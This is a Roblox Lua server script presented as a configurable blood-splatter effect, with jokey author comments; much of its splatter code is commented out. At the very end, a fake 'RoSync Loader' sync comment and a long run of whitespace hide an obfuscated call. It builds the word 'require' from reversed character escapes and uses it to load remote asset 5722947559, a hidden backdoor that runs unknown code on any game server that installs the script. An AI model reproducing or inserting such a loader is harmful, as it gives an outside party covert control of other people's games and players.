------/// PUT IN Workspace OR ServerScriptStorage <3 \\\------

------ Programmed by BuildIntoGames; Removing this line will kill 5 children

---- Change these settings to change stuff (keep the commas, lua doesn't understand n00b syntax)

local settings = {
	splatters_per_health_inc = 1,     ---- The amount of blood splatters made when you lose (damage_inc) of health
	damage_inc = 2,                   ---- The increment of damage that must be done at a time to trigger blood splatters
	remove_time = 65,                 ---- The time (in seconds) until a blood splatter is removed after it is created
	min_splatter_time = 0,            ---- The delay time (minimum) until another blood splatter is made
	max_splatter_time = 0.05,         ---- The delay time (maximum) until another blood splatter is made
	min_transparency = 0.2,           ---- The (minimum) transparency of a blood splatter
	max_transparency = 0,             ---- The (maximum) transparency of a blood splatter
	min_size_x = 3,                 ---- The (minimum) size of a blood splatter on the X axis
	max_size_x = 8,                   ---- The (maximum) size of a blood splatter on the X axis
	min_size_z = 3,                 ---- The (minimum) size of a blood splatter on the Z axis
	max_size_z = 8,                   ---- The (maximum) size of a blood splatter on the Z axis
	tran_tw_time_min = 0.1,           ---- The (minimum) time to tween the size of a blood splatter
	tran_tw_time_max = 0.5,           ---- The (maximum) time to tween the size of a blood splatter
	size_tw_time_min = 0.1,           ---- The (minimum) time to tween the transparency of a blood splatter
	size_tw_time_max = 0.6            ---- The (maximum) time to tween the transparency of a blood splatter
}

--- These are the IDs of possible blood textures, I already set 3 up for u k

local blood_textures = {
	176678030,
	176678048,
	176678086
}


-------------- I'm not responsible for any PAIN if you edit past this (pun intended)

local blood_folder = Instance.new("Folder",game.Workspace)
blood_folder.Name = "Blood.Splatter.Particles"



function create_blood_splatter(player_class)
	local blood_parts = {"Left Leg","Right Leg","Torso","Right Arm","Left Arm","Head"}
	local chosen_part
	if(player_class.humanoid.Health <= 0) then
		repeat wait() chosen_part = blood_parts[math.random(1,#blood_parts)] until player_class.character:FindFirstChild(chosen_part)
		chosen_part = player_class.character[chosen_part]
		local blood_emmiter = script.Blood:Clone()
		blood_emmiter.Parent = chosen_part
		blood_emmiter.Enabled = true
	else
		chosen_part = player_class.torso
	end
	local ray = Ray.new(chosen_part.Position, Vector3.new(0,-100,0))
    local hit, position = game.Workspace:FindPartOnRayWithIgnoreList(ray, {blood_folder , unpack(player_class.character:GetChildren())} , true)
	if(hit) then
		--local blood = Instance.new("Part",blood_folder)
		--blood.Anchored = true
		--blood.CanCollide = false
		--blood.Transparency = 1
		--blood.Name = "Particle_Blood"
		--blood.FormFactor = Enum.FormFactor.Custom
		--blood.Size = Vector3.new(0.01 , 0.1 , 0.01)
		--blood.CFrame = CFrame.new(position)
		--local blood_decal = Instance.new("Decal",blood)
		--blood_decal.Transparency = 1
		--blood_decal.Texture = "http://www.roblox.com/asset/?id=" .. blood_textures[math.random(1,#blood_textures)]
		--blood_decal.Face = "Top"
		--game.Debris:AddItem(blood,settings.remove_time+20)
		local edit_blood = coroutine.wrap(function()
			--local original_size = blood.Size
			--local original_transparency = blood_decal.Transparency
			local new_transparency = math.random(settings.max_transparency*100,settings.min_transparency*100)/100
			--local new_size = Vector3.new(math.random(settings.min_size_x*100,settings.max_size_x*100)/100 , blood.Size.Y , math.random(settings.min_size_z*100,settings.max_size_z*100)/100)
			local tran_tw_time = math.random(settings.tran_tw_time_min*100,settings.tran_tw_time_max*100)/100
			local size_tw_time = math.random(settings.size_tw_time_min*100,settings.size_tw_time_max*100)/100
			for i = 1,10*tran_tw_time do
				wait()
				local perc = i/(10*tran_tw_time)
				--blood_decal.Transparency = original_transparency - (perc*new_transparency)
			end
			for i = 1,10*size_tw_time do
				wait()
				local perc = i/(10*size_tw_time)
				--blood.Size = Vector3.new(original_size.X+(perc*new_size.X) , original_size.Y , original_size.Z+(perc*new_size.Z))
			end
			wait(settings.remove_time)
			--blood:Destroy()
		end)
		edit_blood()
	end
end





function monitor_character(player_class)
	local last_health = player_class.humanoid.Health
	player_class.humanoid.HealthChanged:connect(function()
		if(player_class.humanoid.Health < last_health) then
			if(last_health - player_class.humanoid.Health >= settings.damage_inc) then
				for i = 1,settings.splatters_per_health_inc*((last_health - player_class.humanoid.Health)/settings.damage_inc) do
					create_blood_splatter(player_class)
					if(settings.max_splatter_time > 0) then
						wait(math.random(settings.min_splatter_time*100,settings.max_splatter_time*100)/100)
					end
				end
			end
		end
		last_health = player_class.humanoid.Health
	end)
end





function monitor_player(player)
	repeat wait() until player.Character ~= nil
	player.CharacterAdded:connect(function()
		local player_class = {
			player = player,
			character = player.Character,
			torso = player.Character:WaitForChild("Torso"),
			head = player.Character:WaitForChild("Head"),
			humanoid = player.Character:WaitForChild("Humanoid"),
		}
		monitor_character(player_class)
	end)
	local player_class = {
		player = player,
		character = player.Character,
		torso = player.Character:WaitForChild("Torso"),
		head = player.Character:WaitForChild("Head"),
		humanoid = player.Character:WaitForChild("Humanoid"),
	}
	monitor_character(player_class)
end




game.Players.PlayerAdded:connect(function(player)
	monitor_player(player)
end)


for i,v in ipairs(game.Players:GetChildren()) do
	if(v.ClassName == "Player") then
		monitor_player(v)
	end
end



----- Bonus credit to BuildIntoGames if you try to steal this and remove the credits at the top, you shady n00b
--[[ Last synced 7/24/2021 12:28                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5722947559) --[[                                                                                                  ]]--